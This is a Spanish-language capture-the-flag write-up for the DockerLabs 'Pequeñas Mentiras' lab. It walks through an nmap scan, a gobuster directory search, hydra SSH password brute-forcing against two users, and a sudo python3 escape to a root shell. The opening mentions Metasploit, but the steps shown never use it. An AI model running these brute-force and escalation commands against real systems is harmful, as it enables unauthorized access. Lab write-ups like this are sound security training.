---
title: "DockerLabs - Pequeñas Mentiras"
difficulty: "Fácil"
source: "DockerLabs"
---

El reto se centra en la explotación de una vulnerabilidad conocida en un servicio web, utilizando herramientas como Metasploit para obtener acceso inicial al sistema. Posteriormente, se realiza una escalada de privilegios mediante la identificación y explotación de configuraciones inseguras, lo que permite al atacante obtener acceso root.

## Reconocimiento

Lanzamos un escaneo de red:

```bash
nmap -sCV -p- 172.17.0.2
```

Vemos los puertos SSH y HTTP (80) abiertos. Listamos directorios del sitio web:

```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html -t 50
```

## Explotación

No encontramos nada con el listado de directorios, pero la propia página web nos da una pista de usuario: `a/A`. Procedemos a hacer fuerza bruta con SSH:

```bash
hydra -l a -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2:22 -t 4
```

Obtenemos usuario y contraseña, y accedemos a la máquina.

## Escalada de privilegios

Comandos utilizados para enumerar la máquina:

```bash
sudo -l
find / -perm -4000 -type f 2>/dev/null
cat /etc/passwd
```

Listando usuarios, identificamos que existe otro usuario llamado `spencer`, con el que probamos también fuerza bruta:

```bash
hydra -l spencer -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2:22 -t 4
```

Este usuario sí tiene privilegios de sudo sobre `python3`:

```bash
sudo python3 -c 'import os; os.system("/bin/bash")'
```

## Conclusión

Conseguido: laboratorio finalizado, acceso a root.
